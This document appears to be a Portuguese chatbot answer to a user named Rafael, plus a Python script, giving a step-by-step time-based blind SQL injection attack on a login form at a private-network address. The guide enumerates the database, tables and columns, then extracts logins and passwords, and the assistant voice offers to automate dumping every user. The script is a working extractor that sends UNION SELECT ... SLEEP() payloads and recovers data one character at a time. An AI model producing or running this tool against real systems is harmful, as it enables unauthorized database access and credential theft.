SQL Injection Blind Time-Based


Perfeito, Rafael! Vamos refazer **todo o passo a passo, bem organizado**, desde o início até a extração final de **login e senha**, incluindo explicação sobre como e por que mudar o `OFFSET`. Vou formatar como um guia de ataque completo com Blind SQLi via `time-based`.

---
python3 blind_sqli_extractor_v2.py
# 🛠️ Blind SQLi Time-Based – Guia Completo para Descobrir Login e Senha

### 📍 Alvo: `http://10.10.0.8`

### 🧪 Técnica: `UNION SELECT + IF(SLEEP())` via POST

---

## ✅ 1. Descobrir o nome do banco de dados

### Configuração no script:

```python
sql_target = "(SELECT database())"
```

### Resultado esperado no terminal:

```text
[+] Progresso: c
[+] Progresso: cc
[!] Resultado final: cc
```

O script para sozinho quando não encontra mais caracteres.  
Se demorar muito e já tiver certeza do resultado, pode parar com `Ctrl+C`.

---

## ✅ 2. Descobrir nomes das tabelas

### Agora usamos:

```python
sql_target = "(SELECT table_name FROM information_schema.tables WHERE table_schema='cc' LIMIT 1 OFFSET 0)"
```

🌀 Troque o valor de `OFFSET` para ver as outras tabelas:

|Tentativa|OFFSET|Descobre:|
|---|---|---|
|1|0|Primeira tabela|
|2|1|Segunda tabela|
|3|2|Terceira tabela|
|...|...|...|

✅ Continue testando `OFFSET` até que o script não retorne mais nada (ou só espaço vazio).  
Isso significa que **não há mais tabelas para esse banco**.

---

## ✅ 3. Descobrir colunas da tabela `users`

Se uma das tabelas encontradas se chama `users`, então o próximo passo é extrair suas colunas:

### Use:

```python
sql_target = "(SELECT column_name FROM information_schema.columns WHERE table_name='users' AND table_schema='cc' LIMIT 1 OFFSET 0)"
```

🌀 Vá aumentando o `OFFSET` para pegar todas as colunas da tabela `users`:

|OFFSET|Coluna extraída|
|---|---|
|0|login|
|1|password|
|2|...|

📌 Você deve **continuar incrementando** até que o script **não retorne mais nenhuma coluna**.

---

## ✅ 4. Extrair o conteúdo (usuários e senhas)

Depois de descobrir as colunas da tabela, extraímos os dados com:

### Login:

```python
sql_target = "(SELECT login FROM users LIMIT 1 OFFSET 0)"
```

### Senha:

```python
sql_target = "(SELECT password FROM users LIMIT 1 OFFSET 0)"
```

🌀 Novamente, use `OFFSET` para iterar os usuários:

|OFFSET|login|password|
|---|---|---|
|0|admin|123456|
|1|user|qwerty|
|2|...|...|

---

## 🧠 Dica final:

Se quiser automatizar essa rotação de OFFSET para extrair tudo de uma vez (ex: todos os usuários), posso adaptar o script para **loopar os OFFSETs automaticamente até não vir mais nada**.

Quer que eu adicione isso pra você no script?




import requests

import time

import string

  

# ================== CONFIGURAÇÕES ==================

url = "http://10.10.0.27/login"  # URL do endpoint do login

param_user = "username"          # Nome do campo de usuário no formulário

param_pass = "password"          # Nome do campo de senha no formulário

fixed_password = "123"           # Valor qualquer para o campo senha

  

# Consulta SQL a ser usada (edite aqui para mudar o alvo)

sql_target = "(SELECT database())"  # Exemplo: banco atual

# sql_target = "(SELECT table_name FROM information_schema.tables WHERE table_schema='cc' LIMIT 1 OFFSET 0)"

# sql_target = "(SELECT column_name FROM information_schema.columns WHERE table_name='users' AND table_schema='cc' LIMIT 1 OFFSET 0)"

# sql_target = "(SELECT login FROM users LIMIT 1 OFFSET 0)"

  

sleep_time = 3  # Quantidade de segundos para detectar delay

# ======================================================

  

def enviar_payload(payload):

    """Envia a requisição com payload e mede o tempo de resposta."""

    dados = {

        param_user: payload,

        param_pass: fixed_password

    }

    try:

        inicio = time.time()

        requests.post(url, data=dados, timeout=sleep_time + 1)

        fim = time.time()

        return (fim - inicio) >= sleep_time

    except requests.exceptions.Timeout:

        return True

  

def extrair_dado():

    """Faz brute-force time-based para extrair caractere por caractere."""

    resultado = ""

    print(f"[+] Extraindo: {sql_target}")

    while True:

        achou = False

        for c in string.printable:

            tentativa = resultado + c

            payload = f"' UNION SELECT 1,2,IF(SUBSTRING({sql_target},1,{len(tentativa)})='{tentativa}',SLEEP({sleep_time}),NULL) -- -"

            print(f"[?] Testando: {tentativa}", end="\r")

            if enviar_payload(payload):

                resultado += c

                print(f"[+] Progresso: {resultado}")

                achou = True

                break

        if not achou:

            print(f"[!] Resultado final: {resultado}")

            break

  

def main():

    print("""

==============================================

 BLIND SQLi TIME-BASED EXTRACTOR (v2)

----------------------------------------------

 Altere as CONFIGURAÇÕES no topo para iniciar.

==============================================

    """)

    extrair_dado()

  

if __name__ == "__main__":

    main()